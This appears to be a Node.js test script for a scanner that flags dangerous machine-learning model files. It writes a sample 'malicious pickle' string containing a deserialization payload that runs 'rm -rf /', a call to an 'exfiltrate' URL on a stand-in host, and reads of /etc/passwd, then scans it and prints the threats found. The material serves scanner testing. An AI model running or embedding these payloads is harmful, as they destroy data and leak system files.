#!/usr/bin/env node

// Simple test script for model scanner
import { scanModelFile, isModelFile, getSupportedFormats } from './src/scanner/modelScanner.js';
import { writeFileSync } from 'node:fs';

async function testModelScanner() {
  console.log('🔍 Testing AMC Model Scanner');
  console.log('');
  
  // Show supported formats
  console.log('Supported formats:');
  const formats = getSupportedFormats();
  console.log(formats.join(', '));
  console.log('');
  
  // Create a test malicious pickle file
  const testFile = './test_malicious_model.pkl';
  const maliciousContent = `
import pickle
import subprocess
import os

# Malicious code that would execute on unpickling
class MaliciousPayload:
    def __reduce__(self):
        return (subprocess.call, (['rm', '-rf', '/'], ))

# Embedded API key (fake)
API_KEY = "sk-1234567890abcdef1234567890abcdef12345678"

# Network access code
import urllib.request
urllib.request.urlopen("http://malicious-site.com/exfiltrate")

# File system access
with open("/etc/passwd", "r") as f:
    data = f.read()

# Path traversal
os.system("cat ../../etc/passwd")
`;

  writeFileSync(testFile, maliciousContent, 'utf-8');
  console.log(`Created test file: ${testFile}`);
  
  // Test if it's recognized as a model file
  console.log(`Is model file: ${isModelFile(testFile)}`);
  console.log('');
  
  // Scan the file
  console.log('Scanning for threats...');
  const result = await scanModelFile(testFile, {
    maxFileSize: 10 * 1024 * 1024, // 10MB
    deepScan: true,
    includeHashes: true,
    timeoutMs: 10000
  });
  
  console.log('');
  console.log('=== SCAN RESULTS ===');
  console.log(`File: ${result.filePath}`);
  console.log(`Format: ${result.format}`);
  console.log(`Size: ${result.fileSize} bytes`);
  console.log(`SHA256: ${result.sha256}`);
  console.log(`Risk Level: ${result.riskLevel.toUpperCase()}`);
  console.log(`Scan Duration: ${result.scanDurationMs}ms`);
  console.log('');
  
  if (result.threats.length > 0) {
    console.log('THREATS DETECTED:');
    for (const threat of result.threats) {
      console.log(`  [${threat.severity.toUpperCase()}] ${threat.type}: ${threat.description}`);
      if (threat.evidence) {
        console.log(`    Evidence: ${threat.evidence}`);
      }
    }
  } else {
    console.log('No threats detected.');
  }
  
  console.log('');
  console.log('✅ Model scanner test completed successfully!');
  
  // Clean up
  try {
    const { unlinkSync } = await import('node:fs');
    unlinkSync(testFile);
    console.log('🧹 Test file cleaned up');
  } catch (e) {
    console.log('Note: Could not clean up test file');
  }
}

testModelScanner().catch(console.error);